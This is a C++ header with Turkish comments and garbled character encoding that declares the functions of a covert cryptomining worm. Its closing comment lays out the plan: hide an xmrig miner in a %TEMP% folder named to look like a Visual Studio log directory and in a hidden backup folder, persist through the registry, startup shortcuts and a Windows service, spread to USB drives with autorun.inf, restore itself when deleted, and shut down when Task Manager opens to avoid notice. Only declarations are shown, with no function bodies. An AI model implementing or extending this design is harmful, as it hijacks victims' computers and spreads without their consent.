#pragma once
#include <iostream>
#include <windows.h>
#include <fstream>
#include <atomic>
// Bölüm: Kullanýlan kütüphaneler
#pragma region CodeLiblaries
#include <tlhelp32.h>      // Process snapshot için
#include <vector>          // Dinamik dizi kullanýmý için
#include <string>          // String iþlemleri için
#include <thread>          // Çoklu iþ parçacýðý (thread) için
#include <chrono>          // Zamanlama fonksiyonlarý için
#include <algorithm>       // Algoritma fonksiyonlarý için (örn: std::find)
#include <shlwapi.h>       // Dosya ve yol iþlemleri için (PathRemoveFileSpec gibi)
#include <shlobj.h>         // Shell API fonksiyonlarý için
#pragma comment(lib, "Shlwapi.lib") // shlwapi.lib baðlantýsý
#include "DriverFunctions.cpp"         // Özel sürücü fonksiyonlarý (projede ek olarak tanýmlý)

using namespace std;
#pragma endregion


// =============================================================
// SYSTEM / PROCESS FONKSIYONLARI
// =============================================================

/**
 * @brief Verilen isme sahip çalýþan bir iþlemi sonlandýrýr.
 * @param processName Sonlandýrýlmak istenen iþlemin ismi (örneðin: L"notepad.exe").
 *
 * Bu fonksiyon sistemdeki tüm çalýþan iþlemleri tarar ve isim eþleþmesi bulursa o iþlemi kapatýr.
 */
void KillProcessByName(const std::wstring& processName);

/**
 * @brief Belirtilen isimde bir iþlemin çalýþýp çalýþmadýðýný kontrol eder.
 * @param processName Kontrol edilecek iþlemin adý.
 * @return true: iþlem çalýþýyor, false: iþlem çalýþmýyor.
 *
 * Sistem üzerindeki tüm iþlemleri tarar, verilen isimle eþleþen var mý diye bakar.
 */
bool isProcessRunning(const std::wstring& processName);

/**
 * @brief Belirtilen tam yoldaki iþlemi baþlatýr.
 * @param fullPath Baþlatýlacak uygulamanýn tam dosya yolu (örn: "C:\\Program Files\\MyApp\\app.exe").
 *
 * Yeni bir süreç (process) oluþturur ve programý arka planda görünmeden çalýþtýrýr.
 */
void startProcess(const std::wstring& fullPath);


// =============================================================
// SÜRÜCÜ / DOSYA YÖNETÝMÝ FONKSIYONLARI
// =============================================================

/**
 * @brief Verilen kök dizinin (örn: "E:\\") harici bir sürücü olup olmadýðýný tahmin eder.
 * @param rootPath Kontrol edilecek sürücü kökü.
 * @return true: muhtemelen harici bir sürücüdür. false: deðil.
 *
 * Harici sürücü tipleri (USB gibi) genellikle FAT32, exFAT veya NTFS dosya sistemine sahiptir.
 * Burada sürücünün tipi ve dosya sistemi kontrol edilerek harici olup olmadýðý tahmin edilir.
 */
bool isLikelyExternalDrive(const std::string& rootPath);

/**
 * @brief Sistemdeki takýlý harici sürücüleri listeler.
 * @return Harici sürücü kök dizinlerinin (örn: "E:\\", "F:\\") listesi.
 *
 * Sistemdeki tüm sürücü harflerini tarar, harici sürücü olarak tahmin edilenleri listeye ekler.
 */
std::vector<std::string> getExternalDrives();

/**
 * @brief Verilen dosyayý belirtilen sürücüye kopyalar.
 * @param drivePath Hedef sürücü kök dizini.
 * @param sourceFilePath Kopyalanacak dosyanýn mevcut tam yolu.
 * @param destFileName Hedef dosya adý (örn: "MainProg.exe").
 *
 * Kaynak dosyayý açar, hedef sürücü içine verilen isimle yazar.
 */
void copyToDrive(const std::string& drivePath, const std::string& sourceFilePath, const std::string& destFileName);


// =============================================================
// YOL / BAÞLANGIÇ FONKSIYONLARI                               =
// =============================================================

/**
 * @brief Sistem geçici dizin yolunu döndürür (örn: C:\\Users\\Kullanýcý\\AppData\\Local\\Temp\\).
 * @return Temp klasör yolu.
 *
 * Windows API çaðrýsý ile sistemdeki temp klasörünün yolunu alýr.
 */
std::string getTempPath();

/**
 * @brief Sistem içinde program tarafýndan kullanýlacak yedeklerin saklanacaðý gizli klasör yolunu döndürür.
 * @return Backup (yedek) klasörünün yolu.
 *
 * LocalAppData altýnda "HiddenBin" adlý klasörü oluþturur (yoksa) ve gizli yapar.
 */
std::string getBackupPath();

/**
 * @brief Sistem genelindeki tüm diskleri tarar ve Ozel_Dosyalarm.exe varsa HiddenBin klasörüne yedekler.
 */
void  BackupProgramToHiddenBin(const std::string& fileName);

/**
 * @brief Uygulamanýn baþlangýçta (Windows açýlýþýnda) çalýþmasý için kayýt defterine ekler.
 * @param exePath EXE dosyasýnýn tam yolu.
 * @return true: baþarýyla eklendi, false: hata oluþtu.
 *
 * Öncelikle HKLM (Yönetici izinli) yoluna eklemeye çalýþýr, baþarýsýz olursa HKCU yoluna ekler.
 */
bool AddToStartup(const std::wstring& exePath);

/**
 * @brief Dosya kopyalama iþlemini yapar.
 * @param src Kaynak dosya yolu.
 * @param dest Hedef dosya yolu.
 * @return true: kopyalama baþarýlý, false: baþarýsýz.
 */
bool copyFile(const std::string& src, const std::string& dest);

/**
 * @brief Belirtilen dosyalarý izler; eðer dosya silinirse backup klasöründen geri yükler.
 * @param files Ýzlenecek dosyalar listesi.
 * @param tempPath Ýzlenecek dosyalarýn bulunduðu klasör.
 * @param backupPath Yedek dosyalarýn bulunduðu klasör.
 * @param running Programýn çalýþýp çalýþmadýðýný belirten atomic boolean.
 *
 * Bu fonksiyon genellikle bir iþ parçacýðýnda sürekli çalýþýr.
 */

void monitorAndRestore(const std::vector<std::string>& files,
    const std::string& tempPath,
    const std::string& backupPath,
    std::atomic<bool>& running);
/**
 * @brief Programýn yönetici olarak çalýþýp çalýþmadýðýný kontrol eder.
 * @return true: yönetici, false: deðil.
 */
bool IsRunningAsAdmin();

/**
 * @brief Verilen servis adýnda bir Windows servisinin olup olmadýðýný kontrol eder, yoksa kurar.
 * @param serviceName Servis adý.
 *
 * Servis, programýn kendi exe dosyasýyla oluþturulur ve otomatik baþlatýlýr.
 */
void InstallServiceIfNotExists(const std::wstring& serviceName);

/**
 * @brief Baþlangýca (startup) hem kýsayol, hem registry yolu ile ekleme yapar.
 * @return true: her iki yöntemle de baþarýlý, false: en az birinde hata.
 *
 * Kýsayol Windows açýlýþ klasörüne, registry ise HKCU yoluna eklenir.
 */
bool AddToStartupBoth();

/**
 * @brief Kendi özel temp klasör yolunu döner (örn: %TEMP%\VSFeedbackIntelliCodeLogsDatabase\).
 * @return Özel temp klasörünün yolu.
 */

void Check_And_Destroy(const std::vector<std::string>& filesToDelete);

void DestroySetup(const std::string& fileName);


bool detectInfectFromCMD(const std::string& cmdPath);

bool isTaskManagerOpen();

std::string getCustomTempPath();

DWORD GetIdleTimeSeconds();



// Process çalýþýyor mu kontrolü
bool minigProcessRunning(const std::wstring& processName);

// Madenciyi baslat
void startMiner(std::atomic<bool>& running, const std::wstring& xmrigPath);


// ===========================================================
//  PROGRAMIN TAM GÖREVÝ NEDÝR?                              =
// ===========================================================

/*
Bu yazilim diyerlerinden farkli olarak anti virus islemide gorecek
*/

/*

TEMP klasöründe gizli bir klasör açar: VSFeedbackIntelliCodeLogsDatabase

Program sistemde belirli kritik dosyalarý ve miner programýný gizli olarak %TEMP% dizininde ve yedek olarak LocalAppData\HiddenBin klasöründe tutar.

Miner programý sürekli çalýþýyor mu kontrol eder, eðer kapanýrsa tekrar baþlatýr.

Kullanýcý tarafýndan Ctrl+Shift+Esc kombinasyonu ile miner programýný ve kendisini kapatma imkaný saðlar.

Sistem baþlangýcýna (startup) kendini otomatik çalýþacak þekilde ekler (hem registry hem kýsayol yolu ile).

Sistem üzerinde yalnýzca bir örnek çalýþmasýna izin verir (mutex kullanýmý).

Harici USB gibi sürücüleri algýlar ve belirli dosyalarý o sürücülere otomatik kopyalar.

Dosya silinirse yedekten otomatik geri yükler.

Yönetici yetkisi varsa sistem servisi olarak kendini kurar.

Kendi dosyalarýnýn ve miner programýnýn gizliliðini saðlamaya çalýþýr.

Task manager açýlarsa kendini ve minerinkapatir

Disklerin icerisine autorun.inf olusdurur

*/

void startKeyThread(std::atomic<bool>& running);